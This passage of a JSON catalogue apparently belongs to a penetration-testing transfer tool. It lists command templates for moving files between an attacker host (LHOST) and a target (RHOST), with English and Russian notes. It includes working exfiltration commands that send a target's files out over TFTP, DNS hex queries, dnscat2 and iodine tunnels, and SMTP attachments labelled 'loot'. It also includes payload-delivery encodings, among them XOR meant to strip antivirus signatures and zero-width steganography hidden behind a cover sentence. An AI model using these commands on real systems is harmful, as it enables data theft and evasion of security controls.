    "title": "TFTP upload (Linux)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "tftp",
    "family": "native",
    "priority": 10,
    "source": "12",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "tftp {lhost} -c put \"{remotefile}\" {file}"
      }
    ],
    "requires": [
      "tftp"
    ],
    "note": {
      "en": "Uploads into the TFTP root. Use it only on a trusted lab segment.",
      "ru": "Загружает в корень TFTP. Используйте только в доверенном лабораторном сегменте."
    },
    "docs": "docs/en/12-dns-icmp.md"
  },
  {
    "id": "tftp-win-exfil",
    "title": "TFTP upload (Windows)",
    "profiles": [
      "exotic"
    ],
    "os": "windows",
    "direction": "exfil",
    "channel": "tftp",
    "family": "native",
    "priority": 10,
    "source": "12",
    "steps": [
      {
        "side": "rhost",
        "shell": "cmd",
        "text": "tftp -i {lhost} PUT \"{remotefile}\" {file}"
      }
    ],
    "requires": [
      "tftp"
    ],
    "note": {
      "en": "Uploads into the TFTP root. atftpd must have write access to /tftp (the pipeline uses chmod 777); TFTP has no authentication.",
      "ru": "Загружает в корень TFTP. У atftpd должен быть доступ на запись в /tftp (пайплайн делает chmod 777); в TFTP нет аутентификации."
    },
    "docs": "docs/en/12-dns-icmp.md"
  },
  {
    "id": "dns-exfil",
    "title": "DNS hex queries",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "source": "12",
    "client": [
      {
        "shell": "bash",
        "text": "i=0; for chunk in $(xxd -p \"{remotefile}\" | tr -d '\\n' | fold -w30); do nslookup \"$i.$chunk.{domain}\" {lhost} >/dev/null; i=$((i+1)); done"
      }
    ],
    "requires": [
      "nslookup",
      "xxd"
    ],
    "note": {
      "en": "Set DOMAIN to a zone you control. The LHOST pipeline captures the queries; reassemble the hex chunks from dns.log.",
      "ru": "Укажите DOMAIN - зону, которую контролируете. Пайплайн LHOST захватывает запросы; соберите hex-чанки из dns.log."
    },
    "docs": "docs/en/12-dns-icmp.md",
    "channel": "dns",
    "family": "script",
    "priority": 10
  },
  {
    "id": "dnscat2",
    "title": "dnscat2 tunnel",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "dns",
    "family": "tunnel",
    "priority": 10,
    "source": "12",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "sudo ruby dnscat2.rb --dns \"host=0.0.0.0,port=53\" --no-cache"
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "./dnscat2 --dns server={lhost},port=53"
      }
    ],
    "requires": [
      "ruby",
      "dnscat2"
    ],
    "note": {
      "en": "Encrypted DNS tunnel with upload/download and a shell. Inside the server console use `download {remotefile} {file}`. Windows uses dnscat2.exe.",
      "ru": "Шифрованный DNS-туннель с upload/download и shell. В консоли сервера используйте `download {remotefile} {file}`. В Windows есть dnscat2.exe."
    },
    "docs": "docs/en/12-dns-icmp.md"
  },
  {
    "id": "dns-reassemble",
    "title": "DNS hex reassembly",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "dns",
    "family": "script",
    "priority": 20,
    "source": "12",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "grep -oE '[0-9]+\\.[0-9a-f]+\\.{domain}' \"{lhostpath}/dns.log\" | sort -u | sort -t. -k1,1n | cut -d. -f2 | tr -d '\\n' | xxd -r -p > \"{lhostpath}/{file}\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "sha256sum \"{lhostpath}/{file}\""
      }
    ],
    "requires": [
      "grep",
      "sort",
      "xxd"
    ],
    "note": {
      "en": "Run after the DNS hex sender and the tcpdump capture. It sorts chunks by their numeric prefix and restores the file.",
      "ru": "Запускайте после DNS hex-отправителя и захвата tcpdump. Команда сортирует чанки по числовому префиксу и восстанавливает файл."
    },
    "docs": "docs/en/12-dns-icmp.md"
  },
  {
    "id": "iodine",
    "title": "iodine IP-over-DNS tunnel",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "dns",
    "family": "tunnel",
    "priority": 20,
    "source": "12",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "sudo iodined -f -c -P '{rhost_pass}' 10.0.0.1 {domain}"
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "sudo iodine -f -P '{rhost_pass}' {domain}"
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "scp \"{remotefile}\" 10.0.0.1:\"{lhostpath}/\""
      }
    ],
    "requires": [
      "iodine",
      "openssh-client"
    ],
    "note": {
      "en": "Creates a tun interface over DNS, then uses normal scp inside it. iodine itself does not encrypt; run SSH on top.",
      "ru": "Создаёт tun-интерфейс поверх DNS и использует обычный scp внутри. iodine сам не шифрует; сверху нужен SSH."
    },
    "docs": "docs/en/12-dns-icmp.md"
  },
  {
    "id": "git-clone",
    "title": "git clone",
    "profiles": [
      "core"
    ],
    "os": "linux",
    "direction": "deliver",
    "source": "01",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "git clone https://github.com/user/tools.git \"{lhostpath}/tools\""
      }
    ],
    "requires": [
      "git"
    ],
    "note": {
      "en": "Clones a repository over HTTPS. Replace the example URL with the repository that contains your payload.",
      "ru": "Клонирует репозиторий по HTTPS. Замените пример URL на репозиторий с вашим payload."
    },
    "docs": "docs/en/01-attacker-to-target.md",
    "channel": "git",
    "family": "native",
    "priority": 10
  },
  {
    "id": "smtp-windows",
    "title": "SMTP exfil (Send-MailMessage)",
    "profiles": [
      "exotic"
    ],
    "os": "windows",
    "direction": "exfil",
    "channel": "smtp",
    "family": "powershell",
    "priority": 10,
    "source": "02",
    "steps": [
      {
        "side": "rhost",
        "shell": "powershell",
        "text": "Send-MailMessage -To \"x@{lhost}\" -From \"x@example.com\" -Subject \"report\" -Body \"loot\" -Attachments \"{remotefile}\" -SmtpServer \"{lhost}\" -Port {lport}"
      }
    ],
    "requires": [
      "PowerShell",
      "aiosmtpd"
    ],
    "note": {
      "en": "Plain SMTP on the chosen port. Send-MailMessage is present in PowerShell 5.1; for 587/465 use curl.exe or .NET SmtpClient.",
      "ru": "Обычный SMTP на выбранном порту. Send-MailMessage есть в PowerShell 5.1; для 587/465 используйте curl.exe или .NET SmtpClient."
    },
    "docs": "docs/en/02-target-to-attacker.md"
  },
  {
    "id": "smtp-linux",
    "title": "SMTP exfil (swaks)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "smtp",
    "family": "native",
    "priority": 10,
    "source": "02",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "swaks --to x@{lhost} --server {lhost}:{lport} --attach @\"{remotefile}\" --body 'loot'"
      }
    ],
    "requires": [
      "swaks",
      "aiosmtpd"
    ],
    "note": {
      "en": "Sends the file as a mail attachment. Decode the captured message on LHOST and extract the attachment.",
      "ru": "Отправляет файл вложением. На LHOST декодируйте письмо и извлеките вложение."
    },
    "docs": "docs/en/02-target-to-attacker.md"
  },
  {
    "id": "enc-escape-deliver",
    "title": "\\\\xNN escapes (deliver)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "encoding",
    "family": "text",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "python3 -c \"import codecs,sys;sys.stdout.buffer.write(codecs.escape_encode(open(sys.argv[1],'rb').read())[0])\" \"{lhostpath}/{file}\" > \"{lhostpath}/{file}.esc\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "python3 -c \"import codecs,sys;sys.stdout.buffer.write(codecs.escape_decode(open(sys.argv[1],'rb').read())[0])\" \"{remotefile}.esc\" > \"{remotefile}\""
      }
    ],
    "requires": [
      "python3"
    ],
    "note": {
      "en": "Escapes every non-printable byte as \\\\xNN. For \\\\uXXXX text use the handbook's text examples. Encode on LHOST, transfer the .esc file, decode on RHOST.",
      "ru": "Экранирует каждый непечатаемый байт как \\\\xNN. Для текста с \\\\uXXXX используйте примеры из справочника. Кодируйте на LHOST, передайте файл .esc и декодируйте на RHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-a85-deliver",
    "title": "Ascii85 (deliver)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "encoding",
    "family": "base85",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "python3 -c \"import base64,sys;sys.stdout.buffer.write(base64.a85encode(open(sys.argv[1],'rb').read()))\" \"{lhostpath}/{file}\" > \"{lhostpath}/{file}.a85\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "python3 -c \"import base64,sys;open(sys.argv[2],'wb').write(base64.a85decode(open(sys.argv[1],'rb').read()))\" \"{remotefile}.a85\" \"{remotefile}\""
      }
    ],
    "requires": [
      "python3"
    ],
    "note": {
      "en": "Adobe Ascii85 alphabet, used in PDF/PostScript. Encode on LHOST, transfer the .a85 file, decode on RHOST.",
      "ru": "Алфавит Adobe Ascii85 из PDF/PostScript. Кодируйте на LHOST, передайте файл .a85 и декодируйте на RHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-base32-deliver",
    "title": "Base32 (deliver)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "encoding",
    "family": "base32",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "base32 -w0 \"{lhostpath}/{file}\" > \"{lhostpath}/{file}.b32\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "base32 -d \"{remotefile}.b32\" > \"{remotefile}\""
      }
    ],
    "requires": [
      "base32"
    ],
    "note": {
      "en": "Case-insensitive alphabet, useful for channels that mangle case. Encode on LHOST, send the .b32 file with any transport, then decode on RHOST.",
      "ru": "Регистронезависимый алфавит; полезен для каналов, которые ломают регистр. Кодируйте на LHOST, передайте файл .b32 любым транспортом и декодируйте на RHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-base45-deliver",
    "title": "Base45 (deliver)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "encoding",
    "family": "base45",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "python3 -c \"import base45,sys;sys.stdout.write(base45.b45encode(open(sys.argv[1],'rb').read()).decode())\" \"{lhostpath}/{file}\" > \"{lhostpath}/{file}.b45\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "python3 -c \"import base45,sys;open(sys.argv[2],'wb').write(base45.b45decode(open(sys.argv[1]).read().strip()))\" \"{remotefile}.b45\" \"{remotefile}\""
      }
    ],
    "requires": [
      "python3",
      "base45"
    ],
    "note": {
      "en": "RFC 9285 alphabet, designed for QR and text channels. Encode on LHOST, transfer the .b45 file, decode on RHOST.",
      "ru": "Алфавит RFC 9285, рассчитан на QR и текстовые каналы. Кодируйте на LHOST, передайте файл .b45 и декодируйте на RHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-base58-deliver",
    "title": "Base58 (deliver)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "encoding",
    "family": "base58",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "python3 -c \"import base58,sys;sys.stdout.write(base58.b58encode(open(sys.argv[1],'rb').read()).decode())\" \"{lhostpath}/{file}\" > \"{lhostpath}/{file}.b58\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "python3 -c \"import base58,sys;open(sys.argv[2],'wb').write(base58.b58decode(open(sys.argv[1]).read().strip()))\" \"{remotefile}.b58\" \"{remotefile}\""
      }
    ],
    "requires": [
      "python3",
      "base58"
    ],
    "note": {
      "en": "Bitcoin alphabet without 0OIl. Leading zero bytes are not preserved. Encode on LHOST, transfer the .b58 file, decode on RHOST.",
      "ru": "Биткоин-алфавит без 0OIl. Ведущие нулевые байты не сохраняются. Кодируйте на LHOST, передайте файл .b58 и декодируйте на RHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-base62-deliver",
    "title": "Base62 (deliver)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "encoding",
    "family": "base62",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "python3 -c \"import base62,sys;sys.stdout.write(base62.encodebytes(open(sys.argv[1],'rb').read()))\" \"{lhostpath}/{file}\" > \"{lhostpath}/{file}.b62\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "python3 -c \"import base62,sys;open(sys.argv[2],'wb').write(base62.decodebytes(open(sys.argv[1]).read().strip()))\" \"{remotefile}.b62\" \"{remotefile}\""
      }
    ],
    "requires": [
      "python3",
      "pybase62"
    ],
    "note": {
      "en": "Letters and digits only, URL-safe. Leading zero bytes may be lost. Encode on LHOST, transfer the .b62 file, decode on RHOST.",
      "ru": "Только буквы и цифры, URL-safe. Ведущие нулевые байты могут потеряться. Кодируйте на LHOST, передайте файл .b62 и декодируйте на RHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-base64-deliver",
    "title": "Base64 (deliver)",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "encoding",
    "family": "base64",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "base64 -w0 \"{lhostpath}/{file}\" > \"{lhostpath}/{file}.b64\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "base64 -d \"{remotefile}.b64\" > \"{remotefile}\""
      }
    ],
    "requires": [
      "base64"
    ],
    "note": {
      "en": "Universal text encoding; works over any channel that preserves ASCII. Encode on LHOST, send the .b64 file with any transport, then decode on RHOST.",
      "ru": "Универсальное текстовое кодирование; работает через любой канал, сохраняющий ASCII. Кодируйте на LHOST, передайте файл .b64 любым транспортом и декодируйте на RHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-b85-deliver",
    "title": "Base85 (RFC1924) (deliver)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "encoding",
    "family": "base85",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "python3 -c \"import base64,sys;sys.stdout.buffer.write(base64.b85encode(open(sys.argv[1],'rb').read()))\" \"{lhostpath}/{file}\" > \"{lhostpath}/{file}.b85\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "python3 -c \"import base64,sys;open(sys.argv[2],'wb').write(base64.b85decode(open(sys.argv[1],'rb').read()))\" \"{remotefile}.b85\" \"{remotefile}\""
      }
    ],
    "requires": [
      "python3"
    ],
    "note": {
      "en": "Git/Mercurial Base85 alphabet. Do not mix it with Ascii85. Encode on LHOST, transfer the .b85 file, decode on RHOST.",
      "ru": "Алфавит Base85 из Git/Mercurial. Не смешивайте с Ascii85. Кодируйте на LHOST, передайте файл .b85 и декодируйте на RHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-base91-deliver",
    "title": "Base91 (deliver)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "encoding",
    "family": "base91",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "python3 -c \"import base91,sys;sys.stdout.write(base91.encode(open(sys.argv[1],'rb').read()))\" \"{lhostpath}/{file}\" > \"{lhostpath}/{file}.b91\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "python3 -c \"import base91,sys;open(sys.argv[2],'wb').write(base91.decode(open(sys.argv[1]).read().strip()))\" \"{remotefile}.b91\" \"{remotefile}\""
      }
    ],
    "requires": [
      "python3",
      "base91"
    ],
    "note": {
      "en": "About 23% shorter than Base64, but less supported. Encode on LHOST, transfer the .b91 file, decode on RHOST.",
      "ru": "Примерно на 23% короче Base64, но хуже поддерживается. Кодируйте на LHOST, передайте файл .b91 и декодируйте на RHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-gzip-deliver",
    "title": "gzip + Base64 (deliver)",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "encoding",
    "family": "compression",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "gzip -9 -c \"{lhostpath}/{file}\" | base64 -w0 > \"{lhostpath}/{file}.gz.b64\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "base64 -d \"{remotefile}.gz.b64\" | gunzip > \"{remotefile}\""
      }
    ],
    "requires": [
      "gzip",
      "base64"
    ],
    "note": {
      "en": "Compress first, then encode. The default choice for most files. Encode on LHOST, send the .gz.b64 file with any transport, then decode on RHOST.",
      "ru": "Сначала сжатие, затем кодирование. Обычный выбор для большинства файлов. Кодируйте на LHOST, передайте файл .gz.b64 любым транспортом и декодируйте на RHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-hex-deliver",
    "title": "Hex (deliver)",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "encoding",
    "family": "hex",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "xxd -p \"{lhostpath}/{file}\" | tr -d '\\n' > \"{lhostpath}/{file}.hex\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "xxd -r -p \"{remotefile}.hex\" > \"{remotefile}\""
      }
    ],
    "requires": [
      "xxd"
    ],
    "note": {
      "en": "Plain hex. Twice as large as the input but very hard to break with text filters. Encode on LHOST, send the .hex file with any transport, then decode on RHOST.",
      "ru": "Обычный hex. Вдвое больше исходника, но очень устойчив к текстовым фильтрам. Кодируйте на LHOST, передайте файл .hex любым транспортом и декодируйте на RHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-html-deliver",
    "title": "HTML entities (deliver)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "encoding",
    "family": "text",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "python3 -c \"import html,sys;sys.stdout.write(html.escape(open(sys.argv[1],encoding='utf-8').read()))\" \"{lhostpath}/{file}\" > \"{lhostpath}/{file}.html\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "python3 -c \"import html,sys;sys.stdout.write(html.unescape(sys.stdin.read()))\" < \"{remotefile}.html\" > \"{remotefile}\""
      }
    ],
    "requires": [
      "python3"
    ],
    "note": {
      "en": "Escapes text as HTML entities. Text files only; wrap binary data in Base64 first. Encode on LHOST, transfer the .html file, decode on RHOST.",
      "ru": "Экранирует текст как HTML-сущности. Только текстовые файлы; бинарные данные сначала оберните в Base64. Кодируйте на LHOST, передайте .html и декодируйте на RHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-qr-deliver",
    "title": "QR code (deliver)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "encoding",
    "family": "qr",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "base64 -w0 \"{lhostpath}/{file}\" | qrencode -o \"{lhostpath}/{file}.qr.png\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "zbarimg -q --raw \"{remotefile}.qr.png\" | base64 -d > \"{remotefile}\""
      }
    ],
    "requires": [
      "qrencode",
      "zbarimg",
      "base64"
    ],
    "note": {
      "en": "One QR holds only a small payload; split large files into several QR images. Encode on LHOST, transfer the .qr.png file, decode on RHOST.",
      "ru": "Один QR вмещает небольшой объём; большие файлы делите на несколько QR. Кодируйте на LHOST, передайте файл .qr.png и декодируйте на RHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-qp-deliver",
    "title": "Quoted-printable (deliver)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "encoding",
    "family": "text",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "python3 -c \"import quopri,sys;quopri.encode(sys.stdin.buffer,sys.stdout.buffer,1)\" < \"{lhostpath}/{file}\" > \"{lhostpath}/{file}.qp\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "python3 -c \"import quopri,sys;quopri.decode(sys.stdin.buffer,sys.stdout.buffer)\" < \"{remotefile}.qp\" > \"{remotefile}\""
      }
    ],
    "requires": [
      "python3"
    ],
    "note": {
      "en": "MIME quoted-printable (RFC 2045), useful when parsing mail. Encode on LHOST, transfer the .qp file, decode on RHOST. Quoted-printable is a text format: wrap binary data in Base64 first.",
      "ru": "MIME quoted-printable (RFC 2045), полезно при разборе почты. Кодируйте на LHOST, передайте файл .qp и декодируйте на RHOST. Quoted-printable — текстовый формат: бинарные данные сначала оберните в Base64."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-tar-deliver",
    "title": "tar.gz + Base64 (deliver)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "encoding",
    "family": "archive",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "tar czf - \"{lhostpath}/{file}\" | base64 -w0 > \"{lhostpath}/{file}.tar.gz.b64\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "base64 -d \"{remotefile}.tar.gz.b64\" | tar xzf - -C \"{remote}\""
      }
    ],
    "requires": [
      "tar",
      "gzip",
      "base64"
    ],
    "note": {
      "en": "Packs a file or directory into one text blob and unpacks it into the target directory. Encode on LHOST, send the .tar.gz.b64 file with any transport, then decode on RHOST.",
      "ru": "Упаковывает файл или каталог в один текстовый блок и распаковывает в каталог назначения. Кодируйте на LHOST, передайте файл .tar.gz.b64 любым транспортом и декодируйте на RHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-url-deliver",
    "title": "URL encoding (deliver)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "encoding",
    "family": "text",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "python3 -c \"import urllib.parse,sys;sys.stdout.write(urllib.parse.quote_from_bytes(sys.stdin.buffer.read(),safe=''))\" < \"{lhostpath}/{file}\" > \"{lhostpath}/{file}.uri\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "python3 -c \"import urllib.parse,sys;sys.stdout.buffer.write(urllib.parse.unquote_to_bytes(sys.stdin.buffer.read().decode()))\" < \"{remotefile}.uri\" > \"{remotefile}\""
      }
    ],
    "requires": [
      "python3"
    ],
    "note": {
      "en": "Percent-encoding for URLs and HTTP parameters. Encode on LHOST, transfer the .uri file, decode on RHOST.",
      "ru": "Percent-encoding для URL и HTTP-параметров. Кодируйте на LHOST, передайте файл .uri и декодируйте на RHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-xor-deliver",
    "title": "XOR 0x42 + Base64 (deliver)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "encoding",
    "family": "obfuscation",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "python3 -c \"import base64,sys;open(sys.argv[2],'wb').write(base64.b64encode(bytes(b^0x42 for b in open(sys.argv[1],'rb').read())))\" \"{lhostpath}/{file}\" \"{lhostpath}/{file}.xor.b64\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "python3 -c \"import base64,sys;open(sys.argv[2],'wb').write(bytes(b^0x42 for b in base64.b64decode(open(sys.argv[1],'rb').read())))\" \"{remotefile}.xor.b64\" \"{remotefile}\""
      }
    ],
    "requires": [
      "python3"
    ],
    "note": {
      "en": "XOR removes recognizable strings such as MZ and AV signatures; base64 keeps it text-safe. Encode on LHOST, send the .xor.b64 file with any transport, then decode on RHOST.",
      "ru": "XOR убирает узнаваемые строки вроде MZ и сигнатуры AV; base64 сохраняет текстовый вид. Кодируйте на LHOST, передайте файл .xor.b64 любым транспортом и декодируйте на RHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-zerowidth-deliver",
    "title": "Zero-width (deliver)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "encoding",
    "family": "zero",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "python3 -c \"d=open('{lhostpath}/{file}','rb').read();b=''.join(f'{x:08b}' for x in d);z={chr(48):chr(0x200b),chr(49):chr(0x200c)};open('{lhostpath}/{file}.zw.txt','w',encoding='utf-8').write('Quarterly report.' + ''.join(z[c] for c in b))\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "python3 -c \"t=open('{remotefile}.zw.txt',encoding='utf-8').read();b=''.join('0' if c==chr(0x200b) else '1' for c in t if c in (chr(0x200b),chr(0x200c)));open('{remotefile}','wb').write(bytes(int(b[i:i+8],2) for i in range(0,len(b)-7,8)))\""
      }
    ],
    "requires": [
      "python3"
    ],
    "note": {
      "en": "Hides bits as U+200B/U+200C after a short cover sentence. Do not add spaces or line breaks to the final text. Encode on LHOST, transfer the .zw.txt file, decode on RHOST.",
      "ru": "Прячет биты как U+200B/U+200C после короткого текста-прикрытия. Не добавляйте пробелы и переводы строк в финальный текст. Кодируйте на LHOST, передайте файл .zw.txt и декодируйте на RHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-win-base32-deliver",
    "title": "Base32 (deliver)",
    "profiles": [
      "exotic"
    ],
    "os": "windows",
    "direction": "deliver",
    "channel": "encoding",
    "family": "base32",
    "priority": 20,
    "source": "10",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "base32 -w0 \"{lhostpath}/{file}\" > \"{lhostpath}/{file}.b32\""
      },
      {
        "side": "rhost",
        "shell": "powershell",
        "text": "python -c \"import base64;open(r'{remotefile}','wb').write(base64.b32decode(open(r'{remotefile}.b32').read().strip()))\""
      }
    ],
    "requires": [
      "base32",
      "python"
    ],
    "note": {
      "en": "Windows has no native Base32; Python must be present on the target. Encode on LHOST, send the .b32 file, decode on RHOST.",
      "ru": "В Windows нет штатного Base32; на цели должен быть Python. Кодируйте на LHOST, передайте файл .b32 и декодируйте на RHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-win-base64-deliver",
    "title": "Base64 (deliver)",
    "profiles": [
      "exotic"
    ],
    "os": "windows",
    "direction": "deliver",
    "channel": "encoding",
    "family": "base64",
    "priority": 20,
    "source": "10",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "base64 -w0 \"{lhostpath}/{file}\" > \"{lhostpath}/{file}.b64\""
      },
      {
        "side": "rhost",
        "shell": "powershell",
        "text": "$b=[Convert]::FromBase64String((Get-Content -Raw '{remotefile}.b64'));[IO.File]::WriteAllBytes('{remotefile}',$b)"
      }
    ],
    "requires": [
      "base64",
      "PowerShell"
    ],
    "note": {
      "en": "PowerShell handles the Windows side, so no certutil PEM headers are involved. Encode on LHOST, send the .b64 file, decode on RHOST.",
      "ru": "На стороне Windows работает PowerShell, поэтому заголовков certutil нет. Кодируйте на LHOST, передайте файл .b64 и декодируйте на RHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-base64x2-deliver",
    "title": "Double Base64 (deliver)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "encoding",
    "family": "obfuscation",
    "priority": 20,
    "source": "10",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "base64 -w0 \"{lhostpath}/{file}\" | base64 -w0 > \"{lhostpath}/{file}.b64x2\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "base64 -d \"{remotefile}.b64x2\" | base64 -d > \"{remotefile}\""
      }
    ],
    "requires": [
      "base64"
    ],
    "note": {
      "en": "Two layers survive filters that decode only once. It does not add real confidentiality. Encode on LHOST, send the .b64x2 file with any transport, then decode on RHOST.",
      "ru": "Два слоя переживают фильтры, которые декодируют только один раз. Реальной защиты не даёт. Кодируйте на LHOST, передайте файл .b64x2 любым транспортом и декодируйте на RHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-win-hex-deliver",
    "title": "Hex (deliver)",
    "profiles": [
      "exotic"
    ],
    "os": "windows",
    "direction": "deliver",
    "channel": "encoding",
    "family": "hex",
    "priority": 20,
    "source": "10",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "xxd -p \"{lhostpath}/{file}\" | tr -d '\\n' > \"{lhostpath}/{file}.hex\""
      },
      {
        "side": "rhost",
        "shell": "powershell",
        "text": "$h=(Get-Content -Raw '{remotefile}.hex') -replace '\\s','';$b=for($i=0;$i -lt $h.Length;$i+=2){[Convert]::ToByte($h.Substring($i,2),16)};[IO.File]::WriteAllBytes('{remotefile}',$b)"
      }
    ],
    "requires": [
      "xxd",
      "PowerShell"
    ],
    "note": {
      "en": "Hex is larger but survives filters that reject base64 padding. Encode on LHOST, send the .hex file, decode on RHOST.",
      "ru": "Hex больше по размеру, но проходит фильтры, которые reject-ят padding base64. Кодируйте на LHOST, передайте файл .hex и декодируйте на RHOST."
    },
